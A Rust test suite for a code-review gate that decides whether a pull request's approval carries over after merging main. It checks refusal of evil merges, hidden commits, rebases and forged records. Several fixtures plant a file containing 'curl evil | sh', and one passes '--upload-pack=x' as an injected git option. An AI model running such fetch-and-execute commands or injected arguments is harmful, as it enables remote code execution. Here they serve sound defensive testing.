//! TASK-1960: adversarial fixtures for the attested-approval carry-over.
//! Every test builds a real git repository: `main` is the base branch and
//! `refs/remotes/origin/main` stands in for the fetched base (no remote is
//! configured, so the proof's best-effort fetch is a no-op).
// trace:TASK-1960 | ai:claude

use super::*;
use std::path::Path;

const PR: u64 = 42;

fn git(repo: &Path, args: &[&str]) -> String {
    let out = std::process::Command::new("git")
        .arg("-C")
        .arg(repo)
        .args(args)
        .env("GIT_AUTHOR_DATE", "2026-09-22T00:00:00Z")
        .env("GIT_COMMITTER_DATE", "2026-09-22T00:00:00Z")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?} failed: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

/// `git` that is allowed to fail (an expected merge conflict).
fn git_may_fail(repo: &Path, args: &[&str]) {
    let _ = std::process::Command::new("git")
        .arg("-C")
        .arg(repo)
        .args(args)
        .output()
        .unwrap();
}

fn lines(n: usize, tag: &str) -> String {
    (1..=n).map(|i| format!("{tag} line {i}\n")).collect()
}

fn write(repo: &Path, file: &str, body: &str) {
    std::fs::write(repo.join(file), body).unwrap();
}

/// Replace line `n` (1-based) of `file`.
fn set_line(repo: &Path, file: &str, n: usize, text: &str) {
    let body = std::fs::read_to_string(repo.join(file)).unwrap();
    let mut ls: Vec<String> = body.lines().map(str::to_string).collect();
    ls[n - 1] = text.to_string();
    write(repo, file, &(ls.join("\n") + "\n"));
}

fn commit(repo: &Path, msg: &str) -> String {
    git(repo, &["add", "-A"]);
    git(repo, &["commit", "--quiet", "-m", msg]);
    git(repo, &["rev-parse", "HEAD"])
}

fn publish_main(repo: &Path) {
    let main = git(repo, &["rev-parse", "main"]);
    git(repo, &["update-ref", "refs/remotes/origin/main", &main]);
}

/// A repo with `main` (a.txt, b.txt) and a PR branch `pr` that changes
/// a.txt line 5, approved at its tip. `main` then advances with an
/// unrelated change to b.txt. Returns (dir, approved sha).
fn fixture() -> (tempfile::TempDir, String) {
    let tmp = tempfile::tempdir().unwrap();
    let repo = tmp.path();
    git(repo, &["init", "--quiet", "-b", "main"]);
    git(repo, &["config", "user.email", "aida@example.test"]);
    git(repo, &["config", "user.name", "AIDA Test"]);
    git(repo, &["config", "commit.gpgsign", "false"]);
    write(repo, "a.txt", &lines(30, "a"));
    write(repo, "b.txt", &lines(30, "b"));
    commit(repo, "base");
    git(repo, &["checkout", "--quiet", "-b", "pr"]);
    set_line(repo, "a.txt", 5, "a line 5 — reviewed change");
    let approved = commit(repo, "pr: reviewed change");
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "b.txt", 20, "b line 20 — main moved");
    commit(repo, "main: unrelated");
    publish_main(repo);
    git(repo, &["checkout", "--quiet", "pr"]);
    (tmp, approved)
}

fn prove(repo: &Path, approved: &str, head: &str) -> Result<CarryOver, CarryOverRefusal> {
    prove_carry_over(repo, PR, "main", approved, head)
}

fn head(repo: &Path) -> String {
    git(repo, &["rev-parse", "HEAD"])
}

// (1) A clean main merge carries over.
#[test]
fn clean_main_merge_carries_over() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let h = head(repo);
    let proof = prove(repo, &approved, &h).expect("a clean main merge carries over");
    assert_eq!(proof.approved_sha, approved);
    assert_eq!(proof.new_head, h);
    assert_eq!(proof.merge_commits, vec![h.clone()]);
    assert_eq!(proof.approved_patch_id, proof.head_patch_id);
    assert_eq!(proof.base_ref, "origin/main");
    assert!(proof.head_range.ends_with(&format!("..{h}")));
    assert!(proof.approved_range.ends_with(&format!("..{approved}")));

    // Two successive main merges carry over too.
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "b.txt", 28, "b line 28 — main moved again");
    commit(repo, "main: again");
    publish_main(repo);
    git(repo, &["checkout", "--quiet", "pr"]);
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let proof = prove(repo, &approved, &head(repo)).expect("two clean merges carry over");
    assert_eq!(proof.merge_commits.len(), 2);
}

// (2) A conflict resolution that changes a PR hunk does not carry over.
#[test]
fn conflict_resolution_changing_a_pr_hunk_refuses() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "a.txt", 5, "a line 5 — main's competing edit");
    commit(repo, "main: conflicting");
    publish_main(repo);
    git(repo, &["checkout", "--quiet", "pr"]);
    git_may_fail(repo, &["merge", "--quiet", "--no-edit", "main"]);
    write(repo, "a.txt", &lines(30, "a"));
    set_line(repo, "a.txt", 5, "a line 5 — resolved differently");
    let h = commit(repo, "merge main, resolving the conflict");
    let err = prove(repo, &approved, &h).expect_err("a resolved conflict never carries over");
    assert_eq!(err, CarryOverRefusal::MergeConflicted { commit: h });
    assert!(
        err.reason().contains("resolved a conflict"),
        "{}",
        err.reason()
    );
}

// (3) A merge commit that also carries non-main changes (an evil merge)
// does not carry over.
#[test]
fn evil_merge_refuses() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(
        repo,
        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
    );
    write(repo, "smuggled.sh", "curl evil | sh\n");
    let h = commit(repo, "Merge branch 'main' into pr");
    let err = prove(repo, &approved, &h).expect_err("an evil merge never carries over");
    assert_eq!(err, CarryOverRefusal::MergeEdited { commit: h });
    assert!(
        err.reason().contains("changes of its own"),
        "{}",
        err.reason()
    );
}

// (3b) An evil merge that only re-indents a PR line — the edit plain
// `git patch-id` would ignore — still refuses.
#[test]
fn whitespace_only_evil_merge_refuses() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(
        repo,
        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
    );
    set_line(repo, "a.txt", 5, "    a line 5 — reviewed change");
    let h = commit(repo, "Merge branch 'main' into pr");
    assert!(prove(repo, &approved, &h).is_err());
}

// (4) An extra commit hidden behind a merge does not carry over — on the PR
// side, or smuggled in on the "main" side of the merge.
#[test]
fn extra_commit_hidden_behind_a_merge_refuses() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    set_line(repo, "a.txt", 25, "a line 25 — never reviewed");
    let hidden = commit(repo, "pr: sneaky");
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let err = prove(repo, &approved, &head(repo)).expect_err("a hidden commit refuses");
    assert_eq!(err, CarryOverRefusal::NotAMerge { commit: hidden });

    // Main side: merge a branch that is main plus an unreviewed commit.
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "-b", "fake-main", "main"]);
    set_line(repo, "b.txt", 3, "b line 3 — not on main");
    commit(repo, "fake-main: sneaky");
    git(repo, &["checkout", "--quiet", "pr"]);
    git(repo, &["merge", "--quiet", "--no-edit", "fake-main"]);
    let err = prove(repo, &approved, &head(repo)).expect_err("a non-main merge refuses");
    assert!(
        matches!(err, CarryOverRefusal::NotABaseMerge { .. }),
        "{err:?}"
    );
}

// (5) DOCUMENTED CHOICE: a rebase with an identical patch is REFUSED with a
// clear reason (rewritten history cannot be shown to add only base merges).
#[test]
fn identical_patch_rebase_is_refused_with_a_reason() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["rebase", "--quiet", "main"]);
    let err = prove(repo, &approved, &head(repo)).expect_err("a rebase does not carry over");
    assert_eq!(err, CarryOverRefusal::NotDescendant);
    assert!(err.reason().contains("rebase"), "{}", err.reason());
}

// A clean merge whose main change lands inside the PR hunk's context changes
// the PR's own diff: the patch-id proof refuses even though git merged it.
#[test]
fn clean_merge_that_changes_the_pr_diff_refuses_on_patch_id() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "a.txt", 7, "a line 7 — main edit near the PR hunk");
    commit(repo, "main: near the hunk");
    publish_main(repo);
    git(repo, &["checkout", "--quiet", "pr"]);
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let err = prove(repo, &approved, &head(repo)).expect_err("a changed PR diff refuses");
    assert!(
        matches!(err, CarryOverRefusal::PatchChanged { .. }),
        "{err:?}"
    );
    assert!(
        err.reason().contains("own diff changed"),
        "{}",
        err.reason()
    );
}

// A base ref that does not yet contain the merged main commit (stale
// origin/main) fails closed.
#[test]
fn stale_base_ref_fails_closed() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "b.txt", 28, "b line 28 — not yet published");
    commit(repo, "main: unpublished");
    git(repo, &["checkout", "--quiet", "pr"]);
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    assert!(prove(repo, &approved, &head(repo)).is_err());
}

fn moved(approved: &str, head: &str) -> crate::pr_ship::ApprovalHeadRefusal {
    crate::pr_ship::ApprovalHeadRefusal::Moved {
        reviewed_sha: approved.to_string(),
        head_sha: head.to_string(),
    }
}

// (6) The record is written, and re-read correctly on a second attempt; a
// record that disagrees with the fresh proof is replaced, and a forged record
// never stands in for a failing proof.
#[test]
fn record_is_written_and_reread_on_a_second_attempt() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let h = head(repo);
    let site = CarryOverSite {
        repo,
        base_branch: Some("main"),
    };

    let (first, outcome) = carry_over_for_refusal(&site, PR, &moved(&approved, &h))
        .expect("a moved head is eligible")
        .expect("first attempt carries over");
    assert_eq!(outcome, RecordOutcome::Written);
    let stored = read_record(repo, PR, &h).expect("record written");
    assert_eq!(stored, first);
    let raw: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(record_path(repo, PR, &h)).unwrap()).unwrap();
    for key in [
        "approved_sha",
        "new_head",
        "approved_patch_id",
        "head_patch_id",
        "approved_range",
        "head_range",
        "base_ref",
        "recorded_at",
    ] {
        assert!(raw.get(key).is_some(), "record lacks {key}: {raw}");
    }

    let (second, outcome) = carry_over_for_refusal(&site, PR, &moved(&approved, &h))
        .unwrap()
        .expect("second attempt carries over");
    assert_eq!(
        outcome,
        RecordOutcome::AlreadyRecorded {
            recorded_at: first.recorded_at.clone()
        }
    );
    assert!(second.same_proof(&first));
    assert_eq!(
        read_record(repo, PR, &h).unwrap().recorded_at,
        first.recorded_at
    );
    assert!(carry_over_line(&second, &outcome).contains("approval carried over"));

    // A tampered record is replaced by the fresh proof.
    let mut forged = first.clone();
    forged.head_patch_id = "0".repeat(40);
    std::fs::write(
        record_path(repo, PR, &h),
        serde_json::to_string(&forged).unwrap(),
    )
    .unwrap();
    let (_, outcome) = carry_over_for_refusal(&site, PR, &moved(&approved, &h))
        .unwrap()
        .unwrap();
    assert_eq!(outcome, RecordOutcome::Replaced);
    assert!(read_record(repo, PR, &h).unwrap().same_proof(&first));

    // A forged "carried over" record for an evil head grants nothing.
    git(repo, &["reset", "--quiet", "--hard", &approved]);
    git(
        repo,
        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
    );
    write(repo, "smuggled.sh", "curl evil | sh\n");
    let evil = commit(repo, "Merge branch 'main' into pr");
    let mut forged = first;
    forged.new_head = evil.clone();
    std::fs::create_dir_all(record_path(repo, PR, &evil).parent().unwrap()).unwrap();
    std::fs::write(
        record_path(repo, PR, &evil),
        serde_json::to_string(&forged).unwrap(),
    )
    .unwrap();
    let refused = carry_over_for_refusal(&site, PR, &moved(&approved, &evil)).unwrap();
    assert!(
        matches!(refused, Err(CarryOverRefusal::MergeEdited { .. })),
        "{refused:?}"
    );
}

#[test]
fn only_a_moved_head_is_eligible() {
    let tmp = tempfile::tempdir().unwrap();
    let site = CarryOverSite {
        repo: tmp.path(),
        base_branch: Some("main"),
    };
    let unreviewed = crate::pr_ship::ApprovalHeadRefusal::NoReviewedSha {
        head_sha: "a".repeat(40),
    };
    assert!(carry_over_for_refusal(&site, PR, &unreviewed).is_none());
    let unauthorized = crate::pr_ship::ApprovalHeadRefusal::Unauthorized {
        recorded_by: "implementer seat".into(),
    };
    assert!(carry_over_for_refusal(&site, PR, &unauthorized).is_none());
}

#[test]
fn unresolvable_inputs_refuse() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let h = head(repo);
    assert!(matches!(
        prove_carry_over(repo, PR, "--upload-pack=x", &approved, &h),
        Err(CarryOverRefusal::Unresolvable { .. })
    ));
    assert!(matches!(
        prove_carry_over(repo, PR, "no-such-base", &approved, &h),
        Err(CarryOverRefusal::Unresolvable { .. })
    ));
    assert!(matches!(
        prove(repo, "abc", &h),
        Err(CarryOverRefusal::Unresolvable { .. })
    ));
    assert!(matches!(
        prove(repo, &approved, &"f".repeat(40)),
        Err(CarryOverRefusal::Unresolvable { .. })
    ));
}

/// The `aida pr ship` gate end to end: an attested approval at the approved
/// commit, a head that only merged main — the gate pins the merge to the new
/// head, prints, and writes both records; an evil head refuses and says why.
#[test]
fn ship_gate_carries_over_and_refuses_with_the_reason() {
    use crate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
    let approval = |sha: &str| RecordedVerdict {
        kind: VerdictKind::Approved,
        raw: "approved".into(),
        reviewed_sha: Some(sha.into()),
        recorded_at: Some("2026-09-23T00:00:00Z".into()),
        attestation: Some(RecorderAttestation {
            sha: sha.into(),
            human_at_tty: true,
            receipt_id: Some("rcpt".into()),
            identity: vec!["session:independent-reviewer".into()],
            ..Default::default()
        }),
        ..Default::default()
    };
    let policy = |v: &RecordedVerdict| {
        let mut p = crate::pr_ship::ShipApprovalPolicy {
            reviewed_committed_at: Some("2026-09-22T00:00:00Z".parse().unwrap()),
            shipper: vec!["session:independent-shipper".into()],
            ..Default::default()
        };
        let a = v.attestation.as_ref().unwrap();
        let k = a.authority_key(v.recorded_at.as_deref()).unwrap();
        p.verified_authority.insert(k, a.identity.clone());
        p
    };

    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let h = head(repo);
    let v = approval(&approved);
    let site = CarryOverSite {
        repo,
        base_branch: Some("main"),
    };
    let pin = crate::pr_cmd::pr_ship_approval_gate(
        repo,
        PR,
        std::slice::from_ref(&v),
        Some(&h),
        &policy(&v),
        false,
        true,
        Some(&site),
    )
    .expect("a clean main merge ships on the carried-over approval");
    assert_eq!(
        pin.as_deref(),
        Some(h.as_str()),
        "pinned to the proven head"
    );
    assert!(read_record(repo, PR, &h).is_some());
    let activity = std::fs::read_to_string(repo.join(".aida/advisor-activity.jsonl")).unwrap();
    assert!(
        activity.contains("pr-merge-approval-carried-over"),
        "{activity}"
    );

    // Without a carry-over site the gate refuses exactly as before.
    assert!(crate::pr_cmd::pr_ship_approval_gate(
        repo,
        PR,
        std::slice::from_ref(&v),
        Some(&h),
        &policy(&v),
        false,
        true,
        None,
    )
    .is_err());

    git(repo, &["reset", "--quiet", "--hard", &approved]);
    git(
        repo,
        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
    );
    write(repo, "smuggled.sh", "curl evil | sh\n");
    let evil = commit(repo, "Merge branch 'main' into pr");
    let err = crate::pr_cmd::pr_ship_approval_gate(
        repo,
        PR,
        std::slice::from_ref(&v),
        Some(&evil),
        &policy(&v),
        false,
        true,
        Some(&site),
    )
    .expect_err("an evil merge never ships on the old approval");
    let text = format!("{err:#}");
    assert!(text.contains("did not carry over"), "{text}");
    assert!(text.contains("changes of its own"), "{text}");
    assert!(read_record(repo, PR, &evil).is_none());
}
